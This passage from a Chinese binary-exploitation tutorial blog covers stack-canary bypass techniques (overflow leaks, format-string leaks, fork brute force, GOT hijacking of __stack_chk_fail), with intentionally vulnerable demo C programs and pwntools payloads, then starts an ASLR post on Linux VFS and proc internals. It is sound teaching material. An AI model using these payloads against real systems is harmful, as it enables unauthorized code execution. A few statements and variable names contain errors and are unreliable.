<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">off_set = <span class="string">b&#x27;A&#x27;</span>*(<span class="number">0x20</span>-<span class="number">0x8</span>)</span><br><span class="line">p.sendline(off_set)</span><br><span class="line">result = p.recvuntil(<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x20</span>-<span class="number">0x8</span>)+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">canary = u64(<span class="string">b&#x27;\x00&#x27;</span>+p.recv(<span class="number">7</span>))</span><br></pre></td></tr></table></figure>

<h4 id="1-2-2-格式化字符串直接泄露"><a href="#1-2-2-格式化字符串直接泄露" class="headerlink" title="1.2.2 格式化字符串直接泄露"></a>1.2.2 格式化字符串直接泄露</h4><p>格式化字符串可以完成任意位置读写操作，所以泄露Canary值也是很轻松的</p>
<p>以上面的例子来看</p>
<p>假设测试得到我们输入的内容在栈中第6个位置，并且栈顶到Canary的距离为<code>0x18(0x20-0x8)</code></p>
<p>而一个不带长度的格式化字符会输出8&#x2F;4个字节大小的数据，<code>0x18/0x8=3</code>,所以应该在第<code>6+3=9</code>位置处</p>
<p>payload如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;%9$x&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">canary = <span class="built_in">int</span>(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>)[:-<span class="number">1</span>],<span class="number">16</span>)</span><br></pre></td></tr></table></figure>

<h4 id="1-2-3-逐字节爆破绕过Canary"><a href="#1-2-3-逐字节爆破绕过Canary" class="headerlink" title="1.2.3 逐字节爆破绕过Canary"></a>1.2.3 逐字节爆破绕过Canary</h4><blockquote>
<p>适用于有通过<code>fork()</code>函数创建的子进程的程序</p>
</blockquote>
<p>某些题目中存在<code>fork()</code>函数，且程序开启了Canary函数，当程序进入到子进程的时候，<strong>其Canary的值和父进程中Canary的值一样</strong>（因为fork函数为拷贝父进程的内存），一次你在一定体哦阿健下我们可以将Canary爆破出来</p>
<p>需要的条件有：</p>
<ul>
<li>程序中存在栈溢出的漏洞</li>
<li>可以覆盖到Canary的位置</li>
</ul>
<blockquote>
<p>对于32位程序，只需要对3字节进行爆破，爆破方式是先利用栈溢出复写次低字节，如果出错的化会报错并且重启子进程，获得正确的次低节点就不会报错，获取正确此地节点之后依次爆破次高字节和高字节</p>
</blockquote>
<p>例程：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span>  </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">getshell</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, <span class="number">0</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">    setbuf(<span class="built_in">stderr</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">vuln</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">100</span>];</span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">0x200</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, buf);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    init();</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Hello Hacker!\n&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (fork()) <span class="comment">//father</span></span><br><span class="line">        &#123;</span><br><span class="line">            wait(<span class="literal">NULL</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="comment">//child</span></span><br><span class="line">        &#123;</span><br><span class="line">            vuln();</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>gcc pwn.c -no-pie -m32 -fstack-protector -z noexecstack -o pwn</code>编译</p>
<p>payload构造</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">canary = <span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">256</span>):</span><br><span class="line">        payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x70</span>-<span class="number">0xC</span>)+canary+p8(j)</span><br><span class="line">        p.send(payload)</span><br><span class="line">        <span class="comment"># time.sleep(0.1)</span></span><br><span class="line">        res = p.recv()</span><br><span class="line">        <span class="keyword">if</span> (<span class="string">b&#x27;stack smashing detected&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> res):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;the <span class="subst">&#123;i&#125;</span> is <span class="subst">&#123;<span class="built_in">hex</span>(j)&#125;</span>&#x27;</span>)</span><br><span class="line">            canary +=p8(j)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">assert</span>(<span class="built_in">len</span>(canary) == i+<span class="number">2</span>)</span><br><span class="line">log.info(<span class="string">&#x27;Canary；&#x27;</span>+<span class="built_in">hex</span>(u32((canary))))</span><br></pre></td></tr></table></figure>

<h4 id="1-2-4-SSP泄露Canary"><a href="#1-2-4-SSP泄露Canary" class="headerlink" title="1.2.4 SSP泄露Canary"></a>1.2.4 SSP泄露Canary</h4><blockquote>
<p>使用与Flag存储于内存空间中的情况</p>
</blockquote>
<p>SSP全称为<code>Stack Smashing Protect</code>，这种方法可以读取内存中的值，当flag在内存中储存时，就可以用这个方法读取flag</p>
<p>直接看<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/177832#h2-3">这篇文章</a>叭</p>
<h4 id="1-2-5-劫持-stack-chk-fail函数"><a href="#1-2-5-劫持-stack-chk-fail函数" class="headerlink" title="1.2.5 劫持_stack_chk_fail函数"></a>1.2.5 劫持<code>_stack_chk_fail</code>函数</h4><p>如果Canary不对，程序会转到<code>stack_chk_fail</code>函数执行，而这个函数是一个普通的延迟绑定函数，可以通过修改GOT表来劫持这个函数</p>
<p>例程：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">getshell</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line">    setbuf(<span class="built_in">stderr</span>, <span class="literal">NULL</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="type">char</span> buf[<span class="number">100</span>];</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">200</span>);#栈溢出</span><br><span class="line">    <span class="built_in">printf</span>(buf);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code> gcc pwn.c -m32 -fstack-protector -no-pie -z noexecstack -z norelro -o pwn</code>编译</p>
<blockquote>
<ul>
<li>劫持函数要修改GOT表，所以关闭RELRO</li>
<li>调用<code>getshell</code>函数，关闭pie</li>
</ul>
</blockquote>
<p>我们直到GOT表中存的是函数的实际地址，如果把<code>_stack_chk_fail</code>函数的got表地址替换为<code>getshell</code>的地址，在canary出错的情况下，调用<code>_stack_chk_fail</code>时就会直接获取到shell</p>
<p>直接用<code>fmtstr_payload</code>就行</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">_stack_chk_fail_got = elf.got[<span class="string">&#x27;_stack_chk_fail&#x27;</span>]</span><br><span class="line">backdoor = elf.sym[<span class="string">&#x27;getshell&#x27;</span>]</span><br><span class="line">payload = fmtstr_payload(<span class="number">10</span>,&#123;stack_chk_fail_got:backdoor&#125;)</span><br><span class="line">payload = payload.ljust(<span class="number">0x70</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">p.send(payload)</span><br></pre></td></tr></table></figure>


      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://maple-pwn.github.io/2025/04/04/basic/ASLR/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Maple">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Maple">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | Maple">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2025/04/04/basic/ASLR/" class="post-title-link" itemprop="url">未命名</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2025-04-04 01:34:36" itemprop="dateCreated datePublished" datetime="2025-04-04T01:34:36+08:00">2025-04-04</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2025-02-28 23:44:14" itemprop="dateModified" datetime="2025-02-28T23:44:14+08:00">2025-02-28</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="ASLR"><a href="#ASLR" class="headerlink" title="ASLR"></a>ASLR</h1><p>有点硬核，打*的先不看</p>
<p>ASLR就是地址空间布局随机化，当ASLR开启时，程序每次运行时的内存布局都是相同的；打开后每次运行时的内存布局都会发生变化</p>
<blockquote>
<ul>
<li>0：完全关闭</li>
<li>1：部分开启（堆、栈、MMAP、动态链接库）</li>
<li>2：完全开启（BRK、堆、栈、MMAP、动态链接库）</li>
</ul>
</blockquote>
<h2 id="1-实现原理"><a href="#1-实现原理" class="headerlink" title="1 实现原理"></a>1 实现原理</h2><p>程序加载到内存中的内存布局是由操作系统决定的，通过上面的ASLR开关方式可以知道，用户空间可以借助内核提供的<code>proc</code>虚文件对ASLR控制</p>
<h3 id="1-1-虚文件系统"><a href="#1-1-虚文件系统" class="headerlink" title="*1.1 虚文件系统"></a>*1.1 虚文件系统</h3><p>Linux为了避免用户空间程序操作文件时仍需要考虑不同文件系统带来的差异问题，Linux提供了一个统一的接口供用户空间使用，叫做<code>VFS(虚拟文件系统)</code></p>
<p><code>VFS</code>为了支持各种文件系统，它定义一套所有文件系统都支持的接口和数据结构，用于支持各类文件系统和VFS协同工作</p>
<blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file_system_type</span> &#123;</span></span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *name;</span><br><span class="line">    <span class="type">int</span> fs_flags;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FS_REQUIRES_DEV     1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FS_BINARY_MOUNTDATA 2</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FS_HAS_SUBTYPE      4</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FS_USERNS_MOUNT     8   <span class="comment">/* Can be mounted by userns root */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FS_DISALLOW_NOTIFY_PERM 16  <span class="comment">/* Disable fanotify permission events */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FS_ALLOW_IDMAP         32      <span class="comment">/* FS has been updated to handle vfs idmappings. */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FS_RENAME_DOES_D_MOVE   32768   <span class="comment">/* FS will handle d_move() during rename() internally. */</span></span></span><br><span class="line">    <span class="type">int</span> (*init_fs_context)(<span class="keyword">struct</span> fs_context *);</span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">fs_parameter_spec</span> *<span class="title">parameters</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">dentry</span> *(*<span class="title">mount</span>) (<span class="keyword">struct</span> <span class="title">file_system_type</span> *, <span class="title">int</span>,</span></span><br><span class="line"><span class="class">               <span class="title">const</span> <span class="title">char</span> *, <span class="title">void</span> *);</span></span><br><span class="line">    <span class="type">void</span> (*kill_sb) (<span class="keyword">struct</span> super_block *);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">module</span> *<span class="title">owner</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">file_system_type</span> * <span class="title">next</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">hlist_head</span> <span class="title">fs_supers</span>;</span></span><br><span class="line"> </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">lock_class_key</span> <span class="title">s_lock_key</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">lock_class_key</span> <span class="title">s_umount_key</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">lock_class_key</span> <span class="title">s_vfs_rename_key</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">lock_class_key</span> <span class="title">s_writers_key</span>[<span class="title">SB_FREEZE_LEVELS</span>];</span></span><br><span class="line"> </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">lock_class_key</span> <span class="title">i_lock_key</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">lock_class_key</span> <span class="title">i_mutex_key</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">lock_class_key</span> <span class="title">invalidate_lock_key</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">lock_class_key</span> <span class="title">i_mutex_dir_key</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></blockquote>
<p>Linux内文件系统需要设置<code>file_system_type</code>信息，然后将设置好的信息提交给<code>register_filesystem</code>函数进行注册，只有完成注册的文件系统才能被VFS操控</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="type">int</span> <span class="title function_">register_filesystem</span> <span class="params">(<span class="keyword">struct</span> file_system_type *)</span>;</span><br></pre></td></tr></table></figure>

<p><code>file_system_type</code>本身比较简单，主要就是定义获取和删除<code>super_block</code>的接口及属性信息，不同文件系统间的<code>file_system_type</code>之间通过链接进行管理</p>
<blockquote>
<p><code>super_block</code>是一个更加复杂的结构体，它定义了文件系统的具体信息和对应文件系统的操作接口，是实际管理文件系统的数据结构</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">super_block</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span>    <span class="title">s_list</span>;</span>     <span class="comment">/* Keep this first */</span></span><br><span class="line">    <span class="type">dev_t</span>           s_dev;      <span class="comment">/* search index; _not_ kdev_t */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span>       s_blocksize_bits;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span>       s_blocksize;</span><br><span class="line">    <span class="type">loff_t</span>          s_maxbytes; <span class="comment">/* Max file size */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">file_system_type</span> *<span class="title">s_type</span>;</span></span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">super_operations</span>   *<span class="title">s_op</span>;</span></span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">dquot_operations</span>   *<span class="title">dq_op</span>;</span></span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">quotactl_ops</span>   *<span class="title">s_qcop</span>;</span></span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">export_operations</span> *<span class="title">s_export_op</span>;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span>       s_flags;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span>       s_iflags;   <span class="comment">/* internal SB_I_* flags */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span>       s_magic;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">dentry</span>       *<span class="title">s_root</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rw_semaphore</span> <span class="title">s_umount</span>;</span></span><br><span class="line">    <span class="type">int</span>         s_count;</span><br><span class="line">    <span class="type">atomic_t</span>        s_active;</span><br><span class="line">    ......</span><br><span class="line">    <span class="type">spinlock_t</span>      s_inode_wblist_lock;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span>    <span class="title">s_inodes_wb</span>;</span>    <span class="comment">/* writeback inodes */</span></span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure></blockquote>
<p>而下面展示了<code>proc</code>文件系统的注册过程</p>
<blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_system_type</span> <span class="title">proc_fs_type</span> =</span> &#123;</span><br><span class="line">    .name           = <span class="string">&quot;proc&quot;</span>,</span><br><span class="line">    .init_fs_context    = proc_init_fs_context,</span><br><span class="line">    .parameters     = proc_fs_parameters,</span><br><span class="line">    .kill_sb        = proc_kill_sb,</span><br><span class="line">    .fs_flags       = FS_USERNS_MOUNT | FS_DISALLOW_NOTIFY_PERM,</span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> __init <span class="title function_">proc_root_init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    ......</span><br><span class="line">    register_filesystem(&amp;proc_fs_type);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></blockquote>
<p><code>proc</code>是进程文件系统，属于Linux中伪文件系统中的一种，它没有对应真实的磁盘或硬盘，而是提供给用户空间便利的使用Linux系统资源的接口。常见的伪文件系统有<code>proc</code>,<code>sys</code>,<code>dev</code>等。<code>proc</code>可以方便的查看进程信息，比如进程的内存布局，CPU信息等</p>
<h3 id="1-2-proc"><a href="#1-2-proc" class="headerlink" title="*1.2 proc"></a>*1.2 proc</h3><p>进行Linux驱动开发时，可以借助<code>proc_ops</code>结构体，<code>proc_create</code>接口、<code>proc_remove</code>接口对<code>proc</code>进行创建和控制。</p>
<p><code>prco_ops</code>结构体中有两个较为重要的成员，即<code>proc_read</code>和<code>proc_write</code>，它们分别会响应虚文件被用户空间读写时的操作。下面给出了创建<code>proc</code>虚文件的示例代码</p>
<blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/proc_fs.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">proc_dir_entry</span>* <span class="title">lde_proc_entry</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"> </span><br><span class="line"><span class="type">static</span> <span class="type">ssize_t</span> <span class="title function_">lde_proc_read</span><span class="params">(<span class="keyword">struct</span> file* file, <span class="type">char</span> __user* ubuf, <span class="type">size_t</span> count, <span class="type">loff_t</span>* data)</span></span><br><span class="line">&#123;</span><br><span class="line">    printk(KERN_INFO <span class="string">&quot;%s called file 0x%px, buffer 0x%px count 0x%lx off 0x%llx\n&quot;</span>,</span><br><span class="line">        __func__, file, ubuf, count, *data);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">static</span> <span class="type">ssize_t</span> <span class="title function_">lde_proc_write</span><span class="params">(<span class="keyword">struct</span> file* file, <span class="type">const</span> <span class="type">char</span> __user* ubuf, <span class="type">size_t</span> count, <span class="type">loff_t</span>* data)</span></span><br><span class="line">&#123;</span><br><span class="line">    printk(KERN_INFO <span class="string">&quot;%s called legnth 0x%lx, 0x%px\n&quot;</span>,</span><br><span class="line">        __func__, count, ubuf);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> count;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">proc_ops</span> <span class="title">lde_proc_ops</span> =</span> &#123;</span><br><span class="line">    .proc_read = lde_proc_read,</span><br><span class="line">    .proc_write = lde_proc_write</span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> <span class="title function_">lde_proc_create</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> ret;</span><br><span class="line"> </span><br><span class="line">    ret = SUCCEED;</span><br><span class="line"> </span><br><span class="line">    lde_proc_entry = proc_create(<span class="string">&quot;lde_proc&quot;</span>, <span class="number">0</span>, <span class="literal">NULL</span>, &amp;lde_proc_ops);</span><br><span class="line">    <span class="keyword">if</span> (!lde_proc_entry) &#123;</span><br><span class="line">        printk(KERN_ERR <span class="string">&quot;%s create proc entry failed\n&quot;</span>, __func__);</span><br><span class="line"> </span><br><span class="line">        ret = PROC_CREATE_FAILED;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">lde_proc_remove</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (lde_proc_entry == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        printk(KERN_INFO <span class="string">&quot;%s proc not exists\n&quot;</span>, __func__);</span><br><span class="line">        <span class="keyword">goto</span> TAG_RETURN;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    proc_remove(lde_proc_entry);</span><br><span class="line"> </span><br><span class="line">TAG_RETURN:</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></blockquote>
<p>通过读写虚文件，可以在<code>dmesg</code>中看到相关的打印信息</p>
<blockquote>
